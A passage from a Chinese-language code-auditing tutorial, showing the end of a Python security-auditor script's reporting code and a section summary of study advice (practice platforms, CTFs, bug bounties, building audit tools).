            by_severity[f.severity] += 1
        report["summary"] = dict(by_severity)
        return json.dumps(report, ensure_ascii=False, indent=2)


def main():
    target = sys.argv[1] if len(sys.argv) > 1 else '.'
    output_format = sys.argv[2] if len(sys.argv) > 2 else 'text'

    auditor = PythonSecurityAuditor(target)
    auditor.audit()

    if output_format == 'json':
        print(auditor.generate_json_report())
    else:
        print(auditor.generate_report())


if __name__ == '__main__':
    main()
```

## 八、本节小结

代码审计能力的提升没有捷径，但有科学的方法。本节核心要点：

1. **刻意练习是基础**：选择略高于能力的挑战，专注单一漏洞类型深入练习，配合即时反馈和间隔复习
2. **记录是关键**：建立个人知识库，每道题记录完整的解题过程、原理分析和修复方案
3. **在线平台是起点**：WebGoat、Juice Shop、PortSwigger Academy 等平台提供安全的练习环境
4. **开源项目是进阶**：对真实项目进行完整审计，从调研到报告全流程实践
5. **CTF是加速器**：限时高压环境锻炼快速发现和利用漏洞的能力
6. **Bug Bounty是实战**：真实系统、真实影响、真实回报，最接近实际工作
7. **工具开发是深化**：构建审计工具加深对漏洞模式的理解，从使用者进化为创造者
8. **持续学习是保障**：安全领域技术更新迅速，保持学习习惯和社区参与至关重要

**最重要的一条建议：多读代码、多动手、多总结。** 代码审计是一项需要大量实践积累的技能，读十遍文档不如亲手发现一个漏洞。从今天开始，选择一个平台，扎进去练。
